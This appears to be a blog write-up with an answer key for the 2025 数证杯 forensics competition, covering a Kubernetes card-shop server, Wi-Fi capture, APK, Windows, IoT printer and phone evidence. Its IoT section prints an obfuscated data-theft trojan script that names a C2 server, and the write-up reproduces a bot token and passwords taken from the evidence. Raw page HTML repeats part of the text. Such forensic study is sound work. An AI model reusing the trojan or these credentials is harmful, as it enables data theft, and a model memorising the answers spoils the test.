app: php-nginx template: metadata: labels: app: php-nginx spec: containers: - name: php-nginx image: webdevops/php-nginx:7.4 ports: - containerPort: 80 env: - name: APP_USER value: \"nginx\" volumeMounts: - name: dujiaoka-pv-storage mountPath: /app - name: nginx-config mountPath: /opt/docker/etc/nginx/vhost.conf subPath: vhost.conf - name: supervisor-config mountPath: /opt/docker/etc/supervisor.d/dujiaoka.conf volumes: - name: dujiaoka-pv-storage persistentVolumeClaim: claimName: dujiaoka - name: nginx-config configMap: name: nginx-dujiaoka-config - name: supervisor-config configMap: name: dujiaoka-supervisor-config --- apiVersion: v1 kind: Service metadata: name: php-nginx-service spec: selector: app: php-nginx ports: - port: 80 targetPort: 80 指定了挂载的目录 mountPath: /app ，localhost机器中把 dujiaoka.tar 解压到 /app\n1.node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)\n源盘SHA256：\n答案：FC9A34\n2.集群配置了多少个node节点？（答案格式：1）\n答案：2\n3.嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）\n答案：09:35:59\n4.Docker的安装日期是？（使用双位数格式，答案格式：01月01日）\n答案：04月08日\n5.Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）\n查看 Docker 服务的环境变量配置 systemctl show docker --property Environment：\n答案：4780\n6.发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）\n查看 Kubernetes 集群中的 Service（服务）kubectl get svc：\n答案：30627\n7.发卡网站部署使用的镜像名称是？（答案格式：root/root）\n根据上题的服务去找对应镜像：\n答案：webdevops/php-nginx\n8.当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）\n查看特定命名空间中的特定Pod详情 kubectl describe pod captcha-bot-6b4d85b765-4ntkh -n default：\n9.发卡网站使用的缓存数据库是？（答案格式：mysql）\npod里有redis\n答案：redis\n10.集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：/root/root）\n答案：/data/k8s_data/default/dujiaoka\n11.Telegram群管机器人配置的API代理域名是？（答案格式：www.xxx.com）\nlocalhost机器 /data/k8s_data/default/captchaBot/config/config.toml：\n#系统设置 [system] app_debbug=false join_hint_after_del_time=60 # 加群验证提示消息多久删除，秒 captcha_timeout=120 # 验证超时时间，秒 runtime_path=\"/runtime\" # 缓存目录 #telegram 配置 [telegram] bot_token=\"8378348497:AAGSu7pC5rrDicjMqa7Mv9atvB1iE5NAZeY\" # 机器人apitoken api_proxy=\"http://kk.xilika.cc\" # telegram api代理，仅大陆地区服务器需要 manage_users=[6213151597] # 超级管理员userid数组，以英文逗号分割，例如123,456,789 #日志配置 [log] max_size=32 max_age=7 max_backups=3 #消息模板 [message] join_hint=\"欢迎 [%s](%s) 加入 %s\\n ⚠️本群已开启新成员验证功能，未通过验证的用户无法发言 \\n超时未完成验证会被移除本群！ \\n⏱本条消息 %d 秒后自动删除\\n👇点击下方按钮自助解除禁言\" captcha_image=\"欢迎您加入[%s]！\\n⚠本群已开启新成员验证功能。\\n👆为了证明您不是机器人，请发送以上图片验证码内容\\n🤖机器人将自动验证您发送的验证码内容是否正确\\n⏱本条验证消息有效期[%d]秒\" verification_complete=\"恭喜您成功通过[🤖人机验证]，系统已为您解除禁言限制。\\n如若还是无法发言，请重启telegram客户端\\n请同时注意群内发言规范，以防永久禁止\" block_hint=\"\\\\#封禁预警\\n[%s](%s) 请注意,您的消息中含有部分违禁词 \\n⚠️您已被系统判断为高风险用户，已被封禁\\n系统已向超管发送预警信息，若由超管判定为误杀，会及时将您解除封禁。\\n您的违禁词包含：%s\" #广告阻止 [adblock] number_of_forbidden_words=2 # 违禁词判定个数，如果一句话中出现的违禁词为该设置个数，则判断为违禁 block_time=-1 # 阻止时间，单位：秒。如果为-1，则代表永久封禁 答案：kk.xilika.cc\n12.嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）\n答案：西门庆交流群\n13.统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）\ncaptchabot数据库查询：\nSELECT COUNT(*) FROM user_captcha_record WHERE captcha_success_time \u003e= '2025-06-01' ; 答案：2422\n14.据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）\n15. 发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）\n16.发卡网站的后台访问路径是？（答案格式：/root）\nlocalhost机器上有dujiaoka.tar，解压就是网址源码，.env：\n答案：/admin\n17.计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）\n仍然是.env：\n答案：UudHxLyk7HqpUcTQ99p6NZMFxC7eInhkagTLks8oYfk=\n18.发卡网站配置的邮件发送人地址是？（答案格式：abc@abc.com）\n19. 当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）\n/config/dujiaoka.php：\n答案：2.0.5\n20. 当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）\n流量包分析 21.黑客攻击的目标路由器SSID为 （答案格式：请按实际值填写）\n22.黑客成功捕获了WIFI中WPA协议握手包，其中有效握手包组数为(完整握手为一组)（答案格式：1）\n使用过滤器 eapol 可以快速定位 WPA 握手的相关报文：\n答案：4\n23.黑客爆破得出的WiFi密码为（提示：密码由小写英文字母和数字组成）（答案格式：abcd1234）\n24.黑客成功连接Wifi后，发现路由器操作系统为？（答案格式：请按实际值填写）\n答案：Linux ImmortalWrt\n25.黑客对路由器后台进行爆破攻击，该路由器后台密码为（答案格式：请按实际值填写）\n26.黑客通过修改路由器设置，将被劫持的域名为（答案格式：www.xxx.com）\n27.黑客在路由器管理后台发现FTP服务配置，FTP登录密码为?（答案格式:请按实际值填写）\n过滤 FTP 协议：\n答案：mast\n28.黑客通过FTP上传了一个压缩包文件，该文件内容为（答案格式：请按实际值填写）\n找PK头：\n爆破密码 4321：\n答案：code:123456789\n29.黑客通过路由器执行shell脚本，反弹shell的监听端口为（答案格式：1）\n几个反弹shell关键词都找一遍，nc：\n答案：4445\n30.黑客通过反弹shell成功控制目标路由器后，总共执行了多少条命令（答案格式：1)\n根据ip 192.168.1.244 来过滤，再翻到最下面的部分找：\n执行的命令：\nipconfig\runame -a\rcd /root\rls 答案：4\nAPK程序分析 31.apk 的版本名称为？ （答案格式：1.1.1）\nAndroidManifest.xml：\nandroid:versionName=\"3.0.12\" 答案：3.0.12\n32.在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）\n在线网站 51.al 脱壳，jadx 反编译 classes2.dex：\n答案：currentTimeMillis\n33.apk运行后getVer()的返回值是多少？（答案格式：1.0.0）\n计算机取证分析 41.操作系统的 Build 版本号是？（答案格式：1）\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion：\n答案：19044\n42.操作系统设置的账户密码最长存留期为多少天？（答案格式：1）\n仿真后命令行输入 net accounts ：\n答案：68\n46.123.VHD 所处的结束扇区是？（答案格式：1）\n先找到 123.vhd，在 C:\\\\Administrator\\Documents 中，在 File 选中文件尾部或直接 Ctrl+End，再回到 Partition 即可找到文件结束扇区：\n答案：27445225\n物联网设备取证分析 66.打印机的主机名称是什么？(答案格式：root)\n答案：print\n67.打印文件存储在哪个目录？(答案格式：/root/root)\n/etc/cups/cups-files.conf：\n# Location of all spool files... #RequestRoot /var/spool/cups 答案：/var/spool/cups\n68.同一天，打印两份文件的用户是谁？(答案格式：root)\n/var/log/cups/page_log：\n答案：alice\n69.分析物联网检材，木马运行后，自身产生的进程ID是多少？（答案格式：1）\n木马 /usr/local/bin/cups-helper：\n#!/usr/bin/python3 # -*- coding: utf-8 -*- # A helper script to manage CUPS spooling and perform health checks. # Do not modify unless you are an authorized technician. # KVJEYIHHXSLOPIEBEAWT4ICCMFZWKNRUEDT3ZFXHUCASALJ6EDS23F7HVSTOJOFS4WHY32F5VQ====== import os import shutil import socket import datetime import re # --- Configuration --- # C2 server for uploading diagnostic data C2_SERVER = \"zUTMugDMx4SO5EjL1gTM\" C2_PORT = \"zQDN\" # Spool directory to monitor SPOOL_DIR = \"GJTJzBXdjZkMlw2bvB3cGJTJyFmdGJTJ\" # Define staging directory for processing before exfiltration STAGING_DIR = \"GJTJlh2YhNmLGJTJw1GdGJTJ\" # Log file for upload activities LOG_FILE = \"==wZvxmLkF2bsBXdGJTJlJXYoNnRyUCbhN2bs5iRyUCdv9mcGJTJ\" # Keyword to identify sensitive documents for \"special handling\" WATCHED_KEYWORD = \"=UmcpZmbvdWYyREMyUCdjVmavJHU\" # --- End Configuration --- def log_message(message): \"\"\"Appends a timestamped message to the log file.\"\"\" now = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\") full_message = f\"[{now}] {message}\\n\" with open(LOG_FILE, 'a') as f: f.write(full_message) def scan_and_stage(): \"\"\"(Simulated) Scans the spool directory and copies sensitive files to the staging area.\"\"\" pass def exfiltrate_data(): \"\"\"(Simulated) 'Uploads' files from the staging directory to the C2 server.\"\"\" if not os.path.exists(STAGING_DIR): return staged_files = os.listdir(STAGING_DIR) if not staged_files: return try: # The system log entry shows this connection attempt. # This part of the script provides the \"ground truth\" for that log. sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(5) # sock.connect((C2_SERVER, C2_PORT)) for filename in staged_files: log_message(f\"SUCCESS: Uploaded {filename} to {C2_SERVER}\") sock.close() except Exception as e: log_message(f\"ERROR: Could not connect to C2 server: {e}\") def main(): scan_and_stage() exfiltrate_data() if __name__ == \"__main__\": main() 答案：2177\n70.分析物联网检材，系统中存在一个非标定时任务，这个任务每隔多少分钟执行？（答案格式：1）\n火眼的定时任务只分析了 /etc/crontab 文件里的内容，/etc/cron.d 目录下还有其他的定时任务，healthcheck：\n答案：10\n71.分析物联网检材，木马程序会窃取文档暂存在隐藏目录，这个目录的绝对路径？（/root/root/）\n先逆置再解base64：GJTJlh2YhNmLGJTJw1GdGJTJ\n答案：/tmp/.cache/\n72.分析物联网检材，木马程序将数据上传到的服务器的IP地址是多少？（答案格式：1.1.1.1）\n先逆置再解base64：zUTMugDMx4SO5EjL1gTM\n答案：185.199.108.153\n73.根据木马程序，它监视的关键字是什么？（答案格式：按照实际情况填写）\n先逆置再解base64：=UmcpZmbvdWYyREMyUCdjVmavJHU\n答案：Project Dragonfire\n移动终端取证分析 火眼识别不了rar，先解压再把data压缩成zip\n74.分析检材中微信ID:wxid_f4s0jmpvrc522对应的手机号后四位为（答案格式：1111）\n答案：8390\n75.分析检材中“华为应用市场”第一次安装日期为（使用双位数格式，答案格式：01月01日）\n答案：09月24日\n76.找出检材中钱包APP，请列出该APP中ETH地址后六位是（字母全大写，答案格式：AAAAAA）\n答案：3FE61F\n77.分析出检材中包含“南昌西站”的图片，计算该图片的MD5后六位？（字母全大写，答案格式：AAAAAA）\n答案：85A51D\n78.手机相册中有张“imtoken助记词1.PNG”图片被破坏，请修复该图片，列出该图片中第三个单词。（答案格式：按照实际情况填写）\n宽高爆破：\n$ python 1.py -f 1.PNG 宽高被改了, 是否CRC爆破宽高? (Y/n):Y CRC32: 0xf2e8fe18 宽度: 1809, hex: 0x711 高度: 222, hex: 0xde 答案：boost\n79.找出一张PNG图片，该图片上显示“助记词2”，请列出该图片上显示的第二个单词。（答案格式：按照实际情况填写）\n答案：delay\n80.找出检材中显示“助记词3”的文档，列出该文档中记录的第三个助记词单词。（答案格式：按照实际情况填写）\n全局搜索 助记词3 ，可以找到备忘录文件，直接打开看不到，藏在文件尾：\n答案：quarter\n81.分析出该组助记词正常顺序中最后一个单词（已知助记词1.助记词2.助记词3中的单词顺序有被调整）。（答案格式：按照实际情况填写）\n82.分析出邮箱中收件人QQ号为“850563586”的姓名（答案格式：按照实际情况填写）\n答案：刘佳雨\n83.得知机主通过某个应用给HHshAL发送了一个文档，该应用的数据包名是什么？（答案格式：com.test）\n答案：dingtong.saichuang\n84.接上题，该应用聊天记录数据库的打开密码是什么？（答案格式：按照实际情况填写）\n数据库 dingtong.db 被加密过\n85.接上题，机主发送的这个加密文档，打开密码是什么？（答案格式：按照实际情况填写）\n86.厉明的身份证地址登记的门牌号是多少？？（答案格式：1）\n身份证_f33.mxt是个zip，需要密码：\n密码：bwX2ZEfE9\n答案：722\n87.分析出“important1.xlsx”文件中体现的“金达欣”银行卡后六位？（答案格式：111111）\nimportant1.xlsx需要密码\n密码：3;s=]-\n答案：935629\n88.接上题，保存“important1.xlsx”打开密码数据的应用，该应用的启动密码是什么？（答案格式：按照实际情况填写）\n答案：3357\n","wordCount":"5218","inLanguage":"en","datePublished":"2025-11-01T00:00:00Z","dateModified":"2025-11-03T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/forensics/szb2025cs/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">数证杯 2025 初赛</h1><div class=post-meta><span title='2025-11-01 00:00:00 +0000 UTC'>November 1, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#%e6%a1%88%e6%83%85%e4%bb%8b%e7%bb%8d aria-label=案情介绍>案情介绍</a></li><li><a href=#%e6%a3%80%e6%9d%90%e8%a7%a3%e5%af%86%e6%8c%82%e8%bd%bd aria-label=检材解密/挂载>检材解密/挂载</a></li><li><a href=#%e6%9c%8d%e5%8a%a1%e5%99%a8%e5%8f%96%e8%af%81 aria-label=服务器取证>服务器取证</a></li><li><a href=#%e6%b5%81%e9%87%8f%e5%8c%85%e5%88%86%e6%9e%90 aria-label=流量包分析>流量包分析</a></li><li><a href=#apk%e7%a8%8b%e5%ba%8f%e5%88%86%e6%9e%90 aria-label=APK程序分析>APK程序分析</a></li><li><a href=#%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%8f%96%e8%af%81%e5%88%86%e6%9e%90 aria-label=计算机取证分析>计算机取证分析</a></li><li><a href=#%e7%89%a9%e8%81%94%e7%bd%91%e8%ae%be%e5%a4%87%e5%8f%96%e8%af%81%e5%88%86%e6%9e%90 aria-label=物联网设备取证分析>物联网设备取证分析</a></li><li><a href=#%e7%a7%bb%e5%8a%a8%e7%bb%88%e7%ab%af%e5%8f%96%e8%af%81%e5%88%86%e6%9e%90 aria-label=移动终端取证分析>移动终端取证分析</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=案情介绍>案情介绍<a hidden class=anchor aria-hidden=true href=#案情介绍>#</a></h2><p>无</p><h2 id=检材解密挂载>检材解密/挂载<a hidden class=anchor aria-hidden=true href=#检材解密挂载>#</a></h2><p>容器密码：GQ7aXryvOC<em>M8qG</em>eXa19K9<em>g&amp;jtHS</em>Gtrimps@Qx<em>aYt4oRwwK</em>HeN0A$#EPv*u</p><p>veracrypt：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/31.png></p><p><img alt=alt loading=lazy src=/images/SZB2025CS/32.png></p><h2 id=服务器取证>服务器取证<a hidden class=anchor aria-hidden=true href=#服务器取证>#</a></h2><p>网站重构：</p><p>一个master + 两个node节点，仿真设置为 NAT 模式，网段设置为192.168.50.1/24</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/33.png></p><p>虚拟网络编辑，VMnet8：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/34.png></p><p>配置网关：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/35.png></p><p>k8s namespace <code>kubectl get namespaces</code>：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/41.png></p><p>k8s pod <code>kubectl get pods -A</code>：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/42.png></p><p>k8s service <code>kubectl get services -A</code>：</p><p><img alt=alt loading=lazy src=/images/SZB2025CS/43.png></p><p>关闭localhost的防火墙：</p><pre tabindex=0><code>systemctl stop firewalld
+</code></pre><p>重建数据库：</p><pre tabindex=0><code>kubectl apply -f mysql-c.yaml
 kubectl apply -f mysql-d.yaml
 kubectl apply -f mysql80-pvc.yaml
-</code></pre><p>mysql 和 redis 的服务都在正常运行：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/44.png"></p>
-<p>web服务的yaml php-nginx-deployment.yaml：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#75715e"># php-nginx-deployment.yaml</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">apps/v1</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Deployment</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">php-nginx</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">matchLabels</span>:
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">app</span>: <span style="color:#ae81ff">php-nginx</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">template</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">metadata</span>:
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">labels</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#f92672">app</span>: <span style="color:#ae81ff">php-nginx</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">spec</span>:
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">containers</span>:
-</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">php-nginx</span>
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">image</span>: <span style="color:#ae81ff">webdevops/php-nginx:7.4</span>
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">ports</span>:
-</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">containerPort</span>: <span style="color:#ae81ff">80</span>
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">env</span>:
-</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">APP_USER</span>
-</span></span><span style="display:flex;"><span>              <span style="color:#f92672">value</span>: <span style="color:#e6db74">&#34;nginx&#34;</span>
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">volumeMounts</span>:
-</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">dujiaoka-pv-storage</span>
-</span></span><span style="display:flex;"><span>              <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/app</span>
-</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-config</span>
-</span></span><span style="display:flex;"><span>              <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/opt/docker/etc/nginx/vhost.conf</span>
-</span></span><span style="display:flex;"><span>              <span style="color:#f92672">subPath</span>: <span style="color:#ae81ff">vhost.conf</span>
-</span></span><span style="display:flex;"><span>            - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">supervisor-config</span>
-</span></span><span style="display:flex;"><span>              <span style="color:#f92672">mountPath</span>: <span style="color:#ae81ff">/opt/docker/etc/supervisor.d/dujiaoka.conf</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">volumes</span>:
-</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">dujiaoka-pv-storage</span>
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">persistentVolumeClaim</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#f92672">claimName</span>: <span style="color:#ae81ff">dujiaoka</span>
-</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-config</span>
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">configMap</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">nginx-dujiaoka-config</span>
-</span></span><span style="display:flex;"><span>        - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">supervisor-config</span>
-</span></span><span style="display:flex;"><span>          <span style="color:#f92672">configMap</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#f92672">name</span>: <span style="color:#ae81ff">dujiaoka-supervisor-config</span>
-</span></span><span style="display:flex;"><span>---
-</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Service</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">php-nginx-service</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selector</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#f92672">app</span>: <span style="color:#ae81ff">php-nginx</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ports</span>:
-</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">port</span>: <span style="color:#ae81ff">80</span>
-</span></span><span style="display:flex;"><span>      <span style="color:#f92672">targetPort</span>: <span style="color:#ae81ff">80</span>
-</span></span></code></pre></div><p>指定了挂载的目录 mountPath: /app ，localhost机器中把 dujiaoka.tar 解压到 /app</p>
-<p>1.node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/36.png"></p>
-<p>源盘SHA256：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/38.png"></p>
-<p>答案：FC9A34</p>
-<p>2.集群配置了多少个node节点？（答案格式：1）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/15.png"></p>
-<p>答案：2</p>
-<p>3.嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/14.png"></p>
-<p>答案：09:35:59</p>
-<p>4.Docker的安装日期是？（使用双位数格式，答案格式：01月01日）</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/13.png"></p>
-<p>答案：04月08日</p>
-<p>5.Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）</p>
-<p>查看 Docker 服务的环境变量配置 <code>systemctl show docker --property Environment</code>：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/37.png"></p>
-<p>答案：4780</p>
-<p>6.发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）</p>
-<p>查看 Kubernetes 集群中的 Service（服务）<code>kubectl get svc</code>：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/39.png"></p>
-<p>答案：30627</p>
-<p>7.发卡网站部署使用的镜像名称是？（答案格式：root/root）</p>
-<p>根据上题的服务去找对应镜像：</p>
-<p><img alt="alt" loading="lazy" src="/images/SZB2025CS/40.png"></p>
-<p>答案：webdevops/php-nginx</p>
-<p>8.当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）</p>
-<p>查看特定命名空间中的特定Pod详情 <code>kubectl describe pod captcha-bot-6b4d85b765-4ntkh -n default</code>：</p>
-<p>9.发卡网站使用的缓存数据库是？（答案格式：mysql）</p>
-<p>pod里有redis</p>
-<p>答案：redis</p>
-<p>10.集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：/root/root）</p>
-<p>答案：/data/k8s_data/default/dujiaoka</p>
-<p>11.Telegram群管机器人配置的API代理域名是？（答案格式：www.xxx.com）</p>
-<p>localhost机器 /data/k8s_data/default/captchaBot/config/config.toml：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#75715e">#系统设置</span>
-</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">system</span>]
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app_debbug</span>=<span style="color:#66d9ef">false</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">join_hint_after_del_time</span>=<span style="color:#ae81ff">60</span> <span style="color:#75715e"># 加群验证提示消息多久删除，秒</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">captcha_timeout</span>=<span style="color:#ae81ff">120</span> <span style="color:#75715e"># 验证超时时间，秒</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">runtime_path</span>=<span style="color:#e6db74">&#34;/runtime&#34;</span> <span style="color:#75715e"># 缓存目录</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#telegram 配置</span>
-</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">telegram</span>]
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bot_token</span>=<span style="color:#e6db74">&#34;8378348497:AAGSu7pC5rrDicjMqa7Mv9atvB1iE5NAZeY&#34;</span> <span style="color:#75715e"># 机器人apitoken</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">api_proxy</span>=<span style="color:#e6db74">&#34;http://kk.xilika.cc&#34;</span> <span style="color:#75715e"># telegram api代理，仅大陆地区服务器需要</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">manage_users</span>=[<span style="color:#ae81ff">6213151597</span>] <span style="color:#75715e"># 超级管理员userid数组，以英文逗号分割，例如123,456,789</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#日志配置</span>
-</span></span><span style="display:flex;"><span>[<span style="color:#a6e22e">log</span>]
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">max_size</span>=<span style="color:#ae81ff">32</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">max_age</span>=<span style="color:#ae81ff">7</span>
